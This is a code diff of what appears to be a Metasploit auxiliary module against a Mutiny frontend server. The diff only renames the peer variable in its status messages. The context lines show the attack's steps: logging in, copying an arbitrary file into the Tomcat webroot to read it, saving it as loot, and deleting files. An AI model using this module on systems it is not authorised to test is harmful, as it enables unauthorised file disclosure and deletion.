@@ -51,13 +51,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    @peer = "#{rhost}:#{rport}"
-
-    print_status("#{@peer} - Trying to login")
+    print_status("#{peer} - Trying to login")
     if login
-      print_good("#{@peer} - Login successful")
+      print_good("#{peer} - Login successful")
     else
-      print_error("#{@peer} - Login failed, review USERNAME and PASSWORD options")
+      print_error("#{peer} - Login failed, review USERNAME and PASSWORD options")
       return
     end
 
@@ -71,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def read_file(file)
 
-    print_status("#{@peer} - Copying file to Web location...")
+    print_status("#{peer} - Copying file to Web location...")
 
     dst_path = "/usr/jakarta/tomcat/webapps/ROOT/m/"
     res = send_request_cgi(
@@ -88,12 +86,12 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /\{"success":true\}/
-      print_good("#{@peer} - File #{file} copied to #{dst_path} successfully")
+      print_good("#{peer} - File #{file} copied to #{dst_path} successfully")
     else
-      print_error("#{@peer} - Failed to copy #{file} to #{dst_path}")
+      print_error("#{peer} - Failed to copy #{file} to #{dst_path}")
     end
 
-    print_status("#{@peer} - Retrieving file contents...")
+    print_status("#{peer} - Retrieving file contents...")
 
     res = send_request_cgi(
       {
@@ -103,9 +101,9 @@ class Metasploit3 < Msf::Auxiliary
 
     if res and res.code == 200
       store_path = store_loot("mutiny.frontend.data", "application/octet-stream", rhost, res.body, file)
-      print_good("#{@peer} - File successfully retrieved and saved on #{store_path}")
+      print_good("#{peer} - File successfully retrieved and saved on #{store_path}")
     else
-      print_error("#{@peer} - Failed to retrieve file")
+      print_error("#{peer} - Failed to retrieve file")
     end
 
     # Cleanup
@@ -113,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def delete_file(file)
-    print_status("#{@peer} - Deleting file #{file}")
+    print_status("#{peer} - Deleting file #{file}")
 
     res = send_request_cgi(
     {
@@ -127,9 +125,9 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /\{"success":true\}/
-      print_good("#{@peer} - File #{file} deleted")
+      print_good("#{peer} - File #{file} deleted")
     else
-      print_error("#{@peer} - Error deleting file #{file}")
+      print_error("#{peer} - Error deleting file #{file}")
     end
   end
 
